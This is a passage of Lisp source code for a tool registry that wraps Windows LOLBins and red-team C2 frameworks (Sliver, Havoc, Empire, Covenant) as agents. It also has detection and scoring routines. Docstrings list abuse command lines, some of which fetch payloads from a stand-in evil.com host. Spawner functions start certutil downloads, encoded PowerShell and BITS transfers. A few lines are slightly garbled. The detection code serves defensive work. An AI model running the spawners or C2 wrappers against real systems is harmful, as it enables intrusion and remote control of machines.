    (cons score (nreverse patterns))))

(defmethod score-lolbin-command ((agent regsvr32-agent) command-line)
  "Score a regsvr32 command line for abuse indicators."
  (car (detect-lolbin-suspicious-activity agent command-line)))

;; ── Rundll32 detection ───────────────────────────────────────────────────

(defmethod detect-lolbin-suspicious-activity ((agent rundll32-agent) line)
  "Detect if rundll32 is being used for malicious execution.

Rundll32 abuse patterns (MITRE ATT&CK T1218.011):
  • rundll32.exe javascript:\"\..\\mshtml,RunHTMLApplication ...\"
    — Executes JavaScript via mshtml
  • rundll32.exe shell32.dll,Control_RunDLL payload.dll
    — Executes a malicious DLL as a control panel
  • rundll32.exe advpack.dll,LaunchINFSection payload.inf,DefaultInstall
    — Executes INF section for persistence
  • rundll32.exe javascript:window.close()
    — Stealth execution technique

Detection logic:
  1. Check for JavaScript/VBScript in command line
  2. Check for suspicious DLL functions
  3. Check for advpack LaunchINFSection
  4. Score each pattern and aggregate."
  (let ((score 0)
        (patterns '()))
    ;; Pattern 1: JavaScript execution
    (when (or (search "javascript:" line) (search "javascript" line)
              (search "vbscript:" line))
      (incf score 50)
      (push "rundll32 javascript/vbscript execution (T1218.011)" patterns))
    ;; Pattern 2: Control_RunDLL with non-standard DLL
    (when (search "control_rundll" line)
      (incf score 30)
      (push "rundll32 Control_RunDLL invocation" patterns))
    ;; Pattern 3: LaunchINFSection (persistence)
    (when (search "launchinfsection" line)
      (incf score 45)
      (push "rundll32 LaunchINFSection (persistence)" patterns))
    ;; Pattern 4: Suspicious DLLs
    (when (or (search "advpack" line) (search "shell32" line)
              (search "setupapi" line))
      (incf score 20)
      (push "rundll32 with system DLL manipulation" patterns))
    (cons score (nreverse patterns))))

(defmethod score-lolbin-command ((agent rundll32-agent) command-line)
  "Score a rundll32 command line for abuse indicators."
  (car (detect-lolbin-suspicious-activity agent command-line)))

;; ── WMIC detection ───────────────────────────────────────────────────────

(defmethod detect-lolbin-suspicious-activity ((agent wmic-agent) line)
  "Detect if wmic is being used for malicious process creation or recon.

WMIC abuse patterns (MITRE ATT&CK T1047):
  • wmic process call create \"cmd.exe /c ...\"
    — Remote process creation
  • wmic /node:target /user:admin /password:pass process list
    — Lateral movement with credentials
  • wmic os get caption,version /format:https://evil.com/payload.xsl
    — XSL stylesheet remote code execution
  • wmic shadowcopy delete
    — Ransomware precursor (deletes shadow copies)

Detection logic:
  1. Check for process call create
  2. Check for remote node specification
  3. Check for /format with remote URL (XSL attack)
  4. Check for shadow copy deletion
  5. Score each pattern and aggregate."
  (let ((score 0)
        (patterns '()))
    ;; Pattern 1: Process creation
    (when (and (search "process" line) (search "call" line)
               (search "create" line))
      (incf score 45)
      (push "wmic process creation (T1047)" patterns))
    ;; Pattern 2: Remote node with credentials
    (when (and (search "/node:" line)
               (or (search "/user:" line) (search "/password:" line)))
      (incf score 40)
      (push "wmic remote execution with credentials" patterns))
    ;; Pattern 3: XSL stylesheet from remote URL
    (when (and (search "/format:" line)
               (or (search "http://" line) (search "https://" line)))
      (incf score 50)
      (push "wmic XSL remote code execution" patterns))
    ;; Pattern 4: Shadow copy operations (ransomware indicator)
    (when (and (search "shadowcopy" line) (search "delete" line))
      (incf score 55)
      (push "wmic shadow copy deletion (ransomware precursor)" patterns))
    (cons score (nreverse patterns))))

(defmethod score-lolbin-command ((agent wmic-agent) command-line)
  "Score a wmic command line for abuse indicators."
  (car (detect-lolbin-suspicious-activity agent command-line)))

;; ── Cscript/Wscript detection ────────────────────────────────────────────

(defmethod detect-lolbin-suspicious-activity ((agent cscript-agent) line)
  "Detect if cscript is being used to execute malicious scripts.

Cscript abuse patterns (MITRE ATT&CK T1216):
  • cscript //E:jscript payload.js
    — Executes JScript with explicit engine
  • cscript http://evil.com/payload.vbs
    — Downloads and executes a remote script
  • cscript .hta file
    — Executes HTML Application
  • cscript //B //NoLogo payload.vbs
    — Silent execution (batch mode, no logo)

Detection logic:
  1. Check for remote script URLs
  2. Check for silent mode flags
  3. Check for script engine override
  4. Score each pattern and aggregate."
  (let ((score 0)
        (patterns '()))
    ;; Pattern 1: Remote script execution
    (when (and (or (search "http://" line) (search "https://" line))
               (or (search ".js" line) (search ".vbs" line)
                   (search ".hta" line) (search ".wsf" line)))
      (incf score 45)
      (push "cscript remote script execution (T1216)" patterns))
    ;; Pattern 2: Silent execution mode
    (when (and (search "//b" line) (search "//nologo" line))
      (incf score 30)
      (push "cscript silent execution mode" patterns))
    ;; Pattern 3: Script engine override
    (when (or (search "//e:jscript" line) (search "//e:vbscript" line)
              (search "//e:javascript" line))
      (incf score 25)
      (push "cscript explicit engine specification" patterns))
    ;; Pattern 4: HTA execution
    (when (search ".hta" line)
      (incf score 35)
      (push "cscript HTA execution" patterns))
    (cons score (nreverse patterns))))

(defmethod score-lolbin-command ((agent cscript-agent) command-line)
  "Score a cscript command line for abuse indicators."
  (car (detect-lolbin-suspicious-activity agent command-line)))

;; ── Schtasks detection ───────────────────────────────────────────────────

(defmethod detect-lolbin-suspicious-activity ((agent schtasks-agent) line)
  "Detect if schtasks is being used for malicious persistence.

Schtasks abuse patterns (MITRE ATT&CK T1053.005):
  • schtasks /create /tn \"Updater\" /tr \"cmd.exe /c ...\" /sc hourly
    — Creates a scheduled task for persistence
  • schtasks /create /ru SYSTEM /tr \"powershell ...\"
    — Runs as SYSTEM for privilege escalation
  • schtasks /create /xml C:\\tmp\\task.xml
    — Imports a malicious task definition
  • schtasks /run /tn \"LegitimateTask\"
    — Forces immediate execution of a task

Detection logic:
  1. Check for /create with suspicious triggers
  2. Check for running as SYSTEM
  3. Check for PowerShell/cmd in the task action
  4. Score each pattern and aggregate."
  (let ((score 0)
        (patterns '()))
    ;; Pattern 1: Task creation
    (when (search "/create" line)
      (incf score 15)
      ;; Pattern 1a: With PowerShell or cmd
      (when (or (search "powershell" line) (search "cmd.exe" line)
                (search "cmd" line))
        (incf score 35)
        (push "schtasks creating task with shell execution (T1053.005)"
              patterns))
      ;; Pattern 1b: Running as SYSTEM
      (when (search "/ru system" line)
        (incf score 30)
        (push "schtasks creating SYSTEM-level task" patterns)))
    ;; Pattern 2: XML import
    (when (and (search "/create" line) (search "/xml" line))
      (incf score 25)
      (push "schtasks importing XML task definition" patterns))
    ;; Pattern 3: Forced execution
    (when (search "/run" line)
      (incf score 20)
      (push "schtasks forced task execution" patterns))
    (cons score (nreverse patterns))))

(defmethod score-lolbin-command ((agent schtasks-agent) command-line)
  "Score a schtasks command line for abuse indicators."
  (car (detect-lolbin-suspicious-activity agent command-line)))

;; ── Generic LOLBin detection fallback ────────────────────────────────────

(defmethod detect-lolbin-suspicious-activity ((agent kali-agent) line)
  "Generic LOLBin suspicious activity detection fallback.

When no specialized method exists for a specific LOLBin agent type,
this fallback method applies heuristics that work across all LOLBins:
  1. Check against known patterns in *lolbin-suspicious-patterns*
  2. Look for suspicious URL schemes
  3. Detect encoded payloads
  4. Flag unusual argument combinations

Parameters:
  AGENT — Any kali-agent (used for LOLBin identification).
  LINE  — Command line or output line to analyze.

Returns: (score . matched-patterns) as with specialized methods."
  (let* ((tool-name (pathname-name (agent-binary agent)))
         (patterns (cdr (assoc (intern (string-upcase tool-name) :keyword)
                               *lolbin-suspicious-patterns*
                               :test 'eq)))
         (score 0)
         (matched '()))
    ;; Check registered patterns for this LOLBin
    (when patterns
      (dolist (pat patterns)
        (when (search pat line)
          (incf score 15)
          (push (format nil "~A matched pattern: ~A" tool-name pat) matched))))
    ;; Generic: check for remote URLs in any LOLBin invocation
    (when (or (search "http://" line) (search "https://" line)
              (search "ftp://" line))
      (incf score 20)
      (push (format nil "~A with remote URL reference" tool-name) matched))
    ;; Generic: check for encoded content patterns
    (when (or (search "-enc" line) (search "base64" line)
              (search "frombase64" line))
      (incf score 25)
      (push (format nil "~A with encoding/encryption pattern" tool-name) matched))
    ;; Generic: check for common payload extensions
    (when (or (search ".exe" line) (search ".dll" line)
              (search ".bat" line) (search ".ps1" line))
      (incf score 10)
      (push (format nil "~A referencing executable content" tool-name) matched))
    (cons score (nreverse matched))))

(defmethod score-lolbin-command ((agent kali-agent) command-line)
  "Generic LOLBin command scoring — dispatches to detect-lolbin-suspicious-activity."
  (car (detect-lolbin-suspicious-activity agent command-line)))

;; ─────────────────────────────────────────────────────────────────────────
;; Section F: LOLBin Bulk Analysis Utilities
;; ─────────────────────────────────────────────────────────────────────────

(defun analyze-lolbin-command (tool-name command-line)
  "Analyze a command line for a specific LOLBin and return a full report.

Parameters:
  TOOL-NAME    — Symbol naming the LOLBin (e.g., 'certutil, 'powershell)
  COMMAND-LINE — String, the full command line to analyze.

Returns: A plist with keys:
  :tool          — The tool name symbol
  :command       — The original command line
  :score         — Integer suspicion score (0-100)
  :risk-level    — :low, :medium, :high, or :critical
  :patterns      — List of matched pattern descriptions
  :recommendation — String recommendation for analysts

Example:
  (analyze-lolbin-command 'certutil
    \"certutil -urlcache -split -f http://evil.com/payload.exe\")
    => (:tool certutil :score 85 :risk-level :critical ...)

See also: detect-lolbin-suspicious-activity, score-lolbin-command."
  (let* ((registry-entry (gethash tool-name *offensive-tool-registry*))
         (class-name (when registry-entry (getf registry-entry :class-name)))
         (score 0)
         (patterns '()))
    ;; If we have a loaded agent class, instantiate a dummy for dispatch
    (if (and class-name (find-class class-name nil))
        (let ((dummy (make-instance class-name
                      :binary (or (when registry-entry
                                    (getf registry-entry :binary-path))
                                  "/dev/null")
                      :args '()
                      :tool-category :lolbin)))
          (destructuring-bind (s . ps)
              (detect-lolbin-suspicious-activity dummy command-line)
            (setf score s patterns ps)))
        ;; Fallback: use generic patterns
        (dolist (entry *lolbin-suspicious-patterns*)
          (when (eq (car entry) tool-name)
            (dolist (pat (cdr entry))
              (when (search pat command-line)
                (incf score 15)
                (push (format nil "Pattern match: ~A" pat) patterns))))))
    ;; Determine risk level
    (let ((risk-level (cond ((>= score 81) :critical)
                            ((>= score 51) :high)
                            ((>= score 21) :medium)
                            (t :low))))
      `(:tool ,tool-name
        :command ,command-line
        :score ,score
        :risk-level ,risk-level
        :patterns ,(nreverse patterns)
        :recommendation
        ,(case risk-level
           (:critical "IMMEDIATE ESCALATION: Highly likely malicious LOLBin abuse. Isolate and investigate.")
           (:high "ALERT: Probable malicious usage. Monitor closely and alert security team.")
           (:medium "WARNING: Potentially suspicious activity. Monitor and correlate with other events.")
           (:low "INFO: Likely benign usage. No action required unless correlated with other alerts."))))))

(defun bulk-analyze-lolbin-commands (command-list)
  "Analyze multiple LOLBin commands and return sorted results.

Parameters:
  COMMAND-LIST — List of (tool-name . command-line) cons cells.

Returns: List of analysis plists, sorted by descending suspicion score.

Example:
  (bulk-analyze-lolbin-commands
    '((certutil . \"certutil -urlcache -f http://evil.com/payload.exe\")
      (powershell . \"powershell -ep bypass -enc SGVsbG8=\")))

See also: analyze-lolbin-command."
  (let ((results (mapcar (lambda (entry)
                           (analyze-lolbin-command (car entry) (cdr entry)))
                         command-list)))
    (sort results #'> :key (lambda (r) (getf r :score)))))

(defun get-manifest-summary ()
  "Return a summary of the offensive tool manifest.

Returns: A plist with:
  :total-tools      — Total number of tools in the manifest
  :categories       — List of (category . count) pairs
  :lolbins          — Number of LOLBin entries
  :loaded           — Number of currently loaded tools
  :not-loaded       — Number of tools not yet loaded

Example:
  (get-manifest-summary)
    => (:total-tools 145 :lolbins 36 :loaded 0 :not-loaded 145 ...)

See also: *offensive-tool-manifest*, load-tool-suite."
  (let ((total (length *offensive-tool-manifest*))
        (category-counts (make-hash-table :test 'eq))
        (lolbin-count 0)
        (loaded 0))
    ;; Count by category and LOLBins
    (dolist (entry *offensive-tool-manifest*)
      (destructuring-bind (name category binary-path default-args) entry
        (declare (ignore binary-path default-args))
        (incf (gethash category category-counts 0))
        (when (eq category :lolbin)
          (incf lolbin-count))))
    ;; Count loaded tools
    (maphash (lambda (name props)
               (declare (ignore name))
               (when (getf props :loaded-p)
                 (incf loaded)))
             *offensive-tool-registry*)
    `(:total-tools ,total
      :categories ,(let ((cats '()))
                     (maphash (lambda (k v) (push (cons k v) cats))
                              category-counts)
                     (sort cats #'string< :key (lambda (x) (symbol-name (car x)))))
      :lolbins ,lolbin-count
      :loaded ,loaded
      :not-loaded ,(- total loaded))))

;; ─────────────────────────────────────────────────────────────────────────
;; Section G: Pre-defined LOLBin Agent Instantiators
;; ─────────────────────────────────────────────────────────────────────────
;; These convenience functions create and immediately spawn LOLBin agents
;; with pre-configured arguments for common attack patterns.

(defun spawn-certutil-downloader (url output-path)
  "Spawn a certutil agent configured to download a file from URL.

This creates a certutil-agent with -urlcache -split -f arguments
for downloading remote content. The agent is immediately started
via run-tool.

WARNING: This is a convenience function for authorized testing only.
Downloading content from untrusted URLs is inherently dangerous.

Parameters:
  URL         — String, the remote URL to download from.
  OUTPUT-PATH — String, local path to save the downloaded file.

Returns: The certutil-agent instance, or NIL if spawn failed."
  (handler-case
      (let ((agent (make-certutil-agent
                    :args (list "-urlcache" "-split" "-f" url output-path))))
        (run-tool agent)
        agent)
    (error (e)
      (warn "[SPAWN] Failed to spawn certutil downloader: ~A" e)
      nil)))

(defun spawn-powershell-encoder (command)
  "Spawn a PowerShell agent with an encoded command.

Creates a powershell-agent that base64-encodes the provided command
and executes it via -EncodedCommand. This mirrors a common adversarial
technique and is useful for testing detection capabilities.

Parameters:
  COMMAND — String, the PowerShell command to encode and execute.

Returns: The powershell-agent instance.

See also: detect-lolbin-suspicious-activity for scoring."
  (handler-case
      (let* ((encoded (base64:usb8-array-to-base64-string
                       (flexi-streams:string-to-octets command)))
             (agent (make-powershell-agent
                    :args (list "-NoProfile" "-EncodedCommand" encoded))))
        (run-tool agent)
        agent)
    (error (e)
      (warn "[SPAWN] Failed to spawn PowerShell encoder: ~A" e)
      nil)))

(defun spawn-bitsadmin-transfer (job-name url destination)
  "Spawn a bitsadmin agent configured for a file transfer job.

Creates a bitsadmin-agent with /transfer arguments for downloading
a remote file via the Background Intelligent Transfer Service.

Parameters:
  JOB_NAME    — String, name for the BITS job.
  URL         — String, the remote URL to download from.
  DESTINATION — String, local path to save the file.

Returns: The bitsadmin-agent instance."
  (handler-case
      (let ((agent (make-bitsadmin-agent
                    :args (list "/transfer" job-name url destination))))
        (run-tool agent)
        agent)
    (error (e)
      (warn "[SPAWN] Failed to spawn bitsadmin transfer: ~A" e)
      nil)))

;; ─────────────────────────────────────────────────────────────────────────
;; OFFENSIVE TOOL REGISTRY — Export Summary
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; MACRO (1):
;;   define-offensive-tool         — Generates complete agent class + methods
;;
;; SPECIAL VARIABLES (6):
;;   *offensive-tool-registry*       — Hash table of all loaded tools
;;   *offensive-tool-registry-lock*  — Thread-safety lock
;;   *loaded-tool-categories*        — List of loaded category keywords
;;   *lolbin-suspicious-patterns*    — LOLBin abuse pattern database
;;   *offensive-tool-manifest*       — Master catalog of 145 tools
;;
;; FACTORY FUNCTIONS (4):
;;   load-tool-suite                — Load tools by category from manifest
;;   load-all-offensive-tools       — Load all 145 tools
;;   list-loaded-tools              — Enumerate loaded tools
;;   list-tools-by-category         — Filter tools by category
;;   get-tool-count-by-category     — Count tools per category
;;   get-manifest-summary           — Full manifest statistics
;;
;; GENERIC FUNCTIONS (2):
;;   detect-lolbin-suspicious-activity — Analyze LOLBin usage for abuse
;;   score-lolbin-command           — Numeric scoring of LOLBin commands
;;
;; LOLBIN DETECTION METHODS (8 specialized):
;;   certutil-agent, bitsadmin-agent, mshta-agent, powershell-agent,
;;   regsvr32-agent, rundll32-agent, wmic-agent, cscript-agent,
;;   schtasks-agent + generic kali-agent fallback
;;
;; ANALYSIS UTILITIES (2):
;;   analyze-lolbin-command         — Full analysis with risk level
;;   bulk-analyze-lolbin-commands   — Sort multi-command analysis
;;
;; SPAWNERS (3):
;;   spawn-certutil-downloader      — Pre-configured certutil download
;;   spawn-powershell-encoder       — Pre-configured encoded PowerShell
;;   spawn-bitsadmin-transfer       — Pre-configured BITS transfer
;;
;; MANIFEST: 145 tools across 8 categories
;;   :lolbin              — 36 Windows LOLBins
;;   :creds               — 16 credential dumpers
;;   :lateral             — 20 lateral movement tools
;;   :post-exploit        — 16 C2/post-exploitation frameworks
;;   :web                 — 19 web security tools
;;   :recon               — 16 recon/OSINT tools
;;   :social-engineering  — 13 social engineering tools
;;   :wireless            —  9 wireless security tools
;;
;; "From a single macro, an army of agents. From a manifest, a war."
;; ═══════════════════════════════════════════════════════════════════════════
;;              END OF OFFENSIVE TOOL REGISTRY v2.3.1
;;                    END OF KALI-INTERFACE.LISP
;; ═══════════════════════════════════════════════════════════════════════════

;; ═══════════════════════════════════════════════════════════════════════════
;; Section O.3: C2 Framework Agents — Sliver, Havoc, Empire, Covenant, PoshC2, Mythic
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; Command and Control (C2) frameworks are the backbone of red-team
;; operations. They manage implants (agents/beacons), handle tasking,
;; collect output, and provide tunneling/pivoting capabilities.
;; Each C2 framework has its own protocol, implant format, and operational
;; model. These wrappers provide a unified LispMind interface.

;; ───────────────────────────────────────────────────────────────────────────
;; O.3.1  sliver-agent — Bishop Fox Sliver C2 Framework
;; ───────────────────────────────────────────────────────────────────────────

(defclass sliver-agent (kali-agent)
  ((config :initarg :config
           :accessor sliver-config
           :documentation
           "Path to Sliver client configuration file ( Operator config ).
            Generated by the Sliver server via the 'new-operator' command.
            Contains server address, operator credentials, and TLS config.")
   (operator :initarg :operator
             :accessor sliver-operator
             :documentation
             "Sliver operator name. Must match an operator registered
            on the Sliver server. Used for multi-operator red-team ops.")
   (implant-name :initarg :implant-name
                 :accessor sliver-implant-name
                 :documentation
                 "Name of the implant/session to interact with.
            This identifies a specific compromised endpoint in Sliver.")
   (server-addr :initarg :server-addr
                :initform "localhost:31337"
                :accessor sliver-server-addr
                :documentation
                "Sliver server address (host:port).
            Default localhost:31337 for local C2 server.")
   (interactive :initarg :interactive
                :initform nil
                :accessor sliver-interactive
                :documentation
                "If T, run Sliver in interactive mode (REPL-like).
            If NIL (default), execute a single command and exit."))
  (:documentation
   "Sliver C2 framework agent — Bishop Fox's open-source adversary emulation platform.

Sliver is a cross-platform, open-source red team framework written in Go.
It supports multiple C2 protocols (mutual TLS, HTTP/S, DNS, WireGuard,
named pipes), rich implant functionality (shell, file ops, pivoting,
execute-assembly, in-memory .NET), and multi-operator collaboration.

Key features:
  • Multiple C2 transports (mTLS, HTTP/S, DNS, WireGuard, SMB)
  • In-memory .NET/COFF execution (BOF-compatible)
  • Process injection, token manipulation, lateral movement
  • Multiplayer mode — multiple operators share a C2 server
  • Cross-platform implants (Windows, Linux, macOS)

This agent wraps the 'sliver-client' binary, connecting to a Sliver
server and providing tasking capabilities for a specified implant.

Example:
  ;; Interactive session with a specific implant
  (make-sliver-agent \"IMPLANT-WIN-01\"
    :config \"~/.sliver-client/configs/operator.cfg\"
    :operator \"redteam-alpha\"
    :server-addr \"c2.corp.local:31337\"
    :interactive t)

  ;; Single command execution
  (make-sliver-agent \"IMPLANT-LIN-03\"
    :config \"~/.sliver-client/configs/operator.cfg\"
    :interactive nil)"))

(defun make-sliver-agent (implant-name &key config operator
                                            (server-addr "localhost:31337")
                                            (interactive nil))
  "Create a Sliver C2 framework agent.

Parameters:
  IMPLANT-NAME — Name of the Sliver implant/session to interact with (required).
  CONFIG       — Path to Sliver operator config file (required).
  OPERATOR     — Operator name for multi-operator C2 (optional).
  SERVER-ADDR  — Sliver server address (default \"localhost:31337\").
  INTERACTIVE  — If T, interactive mode; NIL for single command (default).

Returns: A configured SLIVER-AGENT instance.

The sliver-client binary is resolved via FIND-KALI-BINARY. Install
Sliver with: apt install sliver (or download from GitHub releases).

Thread-safety: Creates a new agent instance. Safe from any thread."
  (let* ((binary (or (find-kali-binary "sliver-client")
                     (find-kali-binary "sliver")
                     (warn "[C2] sliver-client not found. Install from: https://github.com/BishopFox/sliver")))
         (args (append
                (when config (list "--config" config))
                (when operator (list "--operator" operator))
                (when server-addr (list "--address" server-addr))
                (if interactive
                    (list "interact" implant-name)
                    (list "-c" (format nil "use ~A; info" implant-name))))))
    (let ((agent (make-instance 'sliver-agent
                                :binary (or binary "sliver-client")
                                :args args
                                :tool-category :exploit
                                :target implant-name
                                :config config
                                :operator operator
                                :implant-name implant-name
                                :server-addr server-addr
                                :interactive interactive
                                :capabilities '(:c2-framework :implant-management
                                                :lateral-movement :pivoting
                                                :dotnet-exec :bof-compatible
                                                :multiplayer-c2)
                                :timeout *c2-default-timeout*
                                :restart-policy #'kali-default-restart-policy)))
      (bt:with-lock-held (*offensive-registry-lock*)
        (setf (gethash (agent-id agent) *c2-agent-registry*) agent))
      (register-kali-agent agent)
      agent)))


;; ───────────────────────────────────────────────────────────────────────────
;; O.3.2  havoc-agent — Havoc C2 Framework
;; ───────────────────────────────────────────────────────────────────────────

(defclass havoc-agent (kali-agent)
  ((profile :initarg :profile
            :accessor havoc-profile
            :documentation
            "Path to Havoc demon (implant) profile YAML file.
            Defines C2 protocol, sleep/jitter, injection settings,
            and evasion techniques for the implant.")
   (listener :initarg :listener
             :accessor havoc-listener
             :documentation
             "Name of the Havoc listener to use.
            Must match a listener configured in the Havoc Teamserver.")
   (server-addr :initarg :server-addr
                :initform "127.0.0.1:40056"
                :accessor havoc-server-addr
                :documentation
                "Havoc Teamserver address (host:port).
            Default 127.0.0.1:40056 (Teamserver default).")
   (teamserver-user :initarg :teamserver-user
                    :initform nil
                    :accessor havoc-teamserver-user
                    :documentation
                    "Teamserver username for authentication.")
   (teamserver-pass :initarg :teamserver-pass
                    :initform nil
                    :accessor havoc-teamserver-pass
                    :documentation
                    "Teamserver password for authentication."))
  (:documentation
   "Havoc C2 framework agent — modern, malleable post-exploitation framework.

Havoc is a modern, malleable post-exploitation command and control
framework created by @C5pider. It features:
  • Malleable C2 profile (HTTP/S, SMB named pipes)
  • Sleep mask evasion with custom sleep obfuscation
  • x64 Return Address Spoofing (RAS) for syscall evasion
  • Demon implants with inline assembly execution
  • Teamserver with built-in listener management
  • Extensible via external c2 profiles

The Havoc framework is designed to evade modern EDR solutions through
a combination of sleep obfuscation, indirect syscalls, and malleable
C2 profiles that blend with normal network traffic.

Example:
  ;; Connect to Havoc Teamserver with a profile
  (make-havoc-agent \"/opt/havoc/profiles/http-transparent.yaml\"
    :listener \"http-listener-01\"
    :server-addr \"10.0.0.5:40056\"
    :teamserver-user \"neo\"
    :teamserver-pass \"redpill\")"))

(defun make-havoc-agent (profile &key listener
                                      (server-addr "127.0.0.1:40056")
                                      teamserver-user
                                      teamserver-pass)
  "Create a Havoc C2 framework agent.

Parameters:
  PROFILE          — Path to Havoc demon profile YAML file (required).
  LISTENER         — Havoc listener name (required).
  SERVER-ADDR      — Teamserver address (default \"127.0.0.1:40056\").
  TEAMSERVER-USER  — Teamserver username (optional).
  TEAMSERVER-PASS  — Teamserver password (optional).

Returns: A configured HAVOC-AGENT instance.

The Havoc binary (havoc) is resolved via FIND-KALI-BINARY.
Install Havoc from: https://github.com/HavocFramework/Havoc

Thread-safety: Creates a new agent instance. Safe from any thread."
  (let* ((binary (or (find-kali-binary "havoc")
                     (warn "[C2] havoc binary not found. Install from: https://github.com/HavocFramework/Havoc")))
         (args (append
                (list "client")
                (when server-addr (list "--host" server-addr))
                (when teamserver-user (list "--user" teamserver-user))
                (when teamserver-pass (list "--password" teamserver-pass))
                (when profile (list "--profile" profile))
                (when listener (list "--listener" listener)))))
    (let ((agent (make-instance 'havoc-agent
                                :binary (or binary "havoc")
                                :args args
                                :tool-category :exploit
                                :target server-addr
                                :profile profile
                                :listener listener
                                :server-addr server-addr
                                :teamserver-user teamserver-user
                                :teamserver-pass teamserver-pass
                                :capabilities '(:c2-framework :malleable-c2
                                                :sleep-obfuscation :indirect-syscall
                                                :edr-evasion :x64-implant)
                                :timeout *c2-default-timeout*
                                :restart-policy #'kali-default-restart-policy)))
      (bt:with-lock-held (*offensive-registry-lock*)
        (setf (gethash (agent-id agent) *c2-agent-registry*) agent))
      (register-kali-agent agent)
      agent)))


;; ───────────────────────────────────────────────────────────────────────────
;; O.3.3  empire-agent — PowerShell Empire C2 Framework
;; ───────────────────────────────────────────────────────────────────────────

(defclass empire-agent (kali-agent)
  ((listener :initarg :listener
             :accessor empire-listener
             :documentation
             "Name of the Empire listener to manage.
            Must match a listener configured in the Empire server.")
   (stager :initarg :stager
           :accessor empire-stager
           :documentation
           "Stager type for Empire agent deployment.
            Common stagers: launcher, macro, duck, dll, etc.")
   (server-addr :initarg :server-addr
                :initform "http://127.0.0.1:1337"
                :accessor empire-server-addr
                :documentation
                "Empire server REST API address.
            Default http://127.0.0.1:1337 (Empire default).")
   (token :initarg :token
          :initform nil
          :accessor empire-token
          :documentation
          "Empire REST API token for authentication.
            Obtain via the Empire CLI with: creds")
   (module :initarg :module
           :initform nil
           :accessor empire-module
           :documentation
           "Empire module to execute (e.g., 'powershell/situational_awareness/network/powerview/get_user')."))
  (:documentation
   "PowerShell Empire C2 framework agent — post-exploitation with PowerShell/Python.

Empire is a post-exploitation framework that includes a pure-PowerShell
Windows agent and a pure-Python Linux/macOS agent. It was originally
developed by @harmj0y, @sixdub, and @enigma0x3 at Veris Group's
Adaptive Threat Division.

Key features:
  • Pure PowerShell 2.0+ Windows agent (no .NET dependencies)
  • Pure Python 2.6+/3.x Linux/macOS agent
  • Modular architecture with 200+ built-in modules
  • Credential harvesting (Mimikatz integration)
  • Lateral movement (Pass-the-Hash, WMI, PSRemoting, DCOM)
  • Persistence mechanisms (registry, scheduled tasks, WMI events)
  • RESTful API for automation and integration

Empire was succeeded by Starkiller (GUI) and then BC-Security's fork.
This agent wraps the Empire CLI, providing tasking and module execution.

Example:
  ;; Manage a listener and execute a module
  (make-empire-agent \"http-listener\"
    :stager \"launcher\"
    :server-addr \"http://10.0.0.5:1337\"
    :module \"powershell/situational_awareness/network/powerview/get_user\")"))

(defun make-empire-agent (listener &key stager
                                        (server-addr "http://127.0.0.1:1337")
                                        token
                                        module)
  "Create a PowerShell Empire C2 framework agent.

Parameters:
  LISTENER    — Empire listener name (required).
  STAGER      — Stager type for agent deployment (optional).
  SERVER-ADDR — Empire server REST API address (default).
  TOKEN       — REST API authentication token (optional).
  MODULE      — Empire module to execute (optional).

Returns: A configured EMPIRE-AGENT instance.

The Empire binary (powershell-empire or empire) is resolved via
FIND-KALI-BINARY. Install with: apt install powershell-empire

Thread-safety: Creates a new agent instance. Safe from any thread."
  (let* ((binary (or (find-kali-binary "powershell-empire")
                     (find-kali-binary "empire")
                     (warn "[C2] Empire not found. Install with: apt install powershell-empire")))
         (args (append
                (when server-addr (list "--api" server-addr))
                (when token (list "--token" token))
                (when listener (list "--listener" listener))
                (when stager (list "--stager" stager))
                (when module (list "--module" module))
                (list "--headless"))))
    (let ((agent (make-instance 'empire-agent
                                :binary (or binary "powershell-empire")
                                :args args
                                :tool-category :exploit
                                :target server-addr
                                :listener listener
                                :stager stager
                                :server-addr server-addr
                                :token token
                                :module module
                                :capabilities '(:c2-framework :powershell-agent
                                                :credential-harvest :mimikatz
                                                :lateral-movement :persistence
                                                :rest-api)
                                :timeout *c2-default-timeout*
                                :restart-policy #'kali-default-restart-policy)))
      (bt:with-lock-held (*offensive-registry-lock*)
        (setf (gethash (agent-id agent) *c2-agent-registry*) agent))
      (register-kali-agent agent)
      agent)))


;; ───────────────────────────────────────────────────────────────────────────
;; O.3.4  covenant-agent — Covenant C2 Framework (.NET)
;; ───────────────────────────────────────────────────────────────────────────

(defclass covenant-agent (kali-agent)
  ((server-addr :initarg :server-addr
                :accessor covenant-server-addr
                :documentation
                "Covenant server API URL.
            Example: https://127.0.0.1:7443")
   (api-token :initarg :api-token
              :accessor covenant-api-token
              :documentation
              "Covenant API authentication token.
            Generated via the Covenant web UI.")
   (grunt-name :initarg :grunt-name
               :accessor covenant-grunt-name
               :documentation
               "Name of the Grunt (implant) to interact with.")
   (listener-name :initarg :listener-name
                  :initform nil
                  :accessor covenant-listener-name
                  :documentation
                  "Covenant listener name for grunt deployment."))
  (:documentation
   "Covenant C2 framework agent — .NET-based command and control.

Covenant is a .NET command and control framework that aims to be a
powerful and flexible tool for red teamers and penetration testers.
It was created by @cobbr and is written in C#.

Key features:
  • Grunt implants (C# compiled) with rich functionality
  • Inline assembly execution (execute arbitrary .NET assemblies)
  • Reflective DLL injection
  • Customizable listeners (HTTP, SMB, Bridge)
  • RESTful API for automation
  • Cross-platform (via .NET Core) — Windows, Linux, macOS
  • Highly extensible with custom tasks and modules

Grunts are the implant/agent in Covenant terminology. They compile
on-the-f-side into position-independent shellcode or assembly payloads.

Example:
  ;; Interact with an existing grunt
  (make-covenant-agent \"https://c2.local:7443\"
    :api-token \"eyJhbGci...\"
    :grunt-name \"GRUNT-WIN-01\")

  ;; Deploy to a new listener
  (make-covenant-agent \"https://127.0.0.1:7443\"
    :api-token \"eyJhbGci...\"
    :listener-name \"HTTP-Listener\")"))

(defun make-covenant-agent (server-addr &key api-token
                                             grunt-name
                                             listener-name)
  "Create a Covenant C2 framework agent.

Parameters:
  SERVER-ADDR   — Covenant server API URL (required).
  API-TOKEN     — API authentication token (required).
  GRUNT-NAME    — Name of existing Grunt to interact with (optional).
  LISTENER-NAME — Covenant listener for new grunt deployment (optional).

Returns: A configured COVENANT-AGENT instance.

Covenant must be installed separately. Clone from:
https://github.com/cobbr/Covenant

Thread-safety: Creates a new agent instance. Safe from any thread."
  (let* ((binary (or (find-kali-binary "Covenant")
                     (find-kali-binary "covenant")
                     (warn "[C2] Covenant not found. Clone from: https://github.com/cobbr/Covenant")))
         (args (append
                (when server-addr (list "--server" server-addr))
                (when api-token (list "--token" api-token))
                (when grunt-name (list "--grunt" grunt-name))
                (when listener-name (list "--listener" listener-name))
                (list "--cli"))))
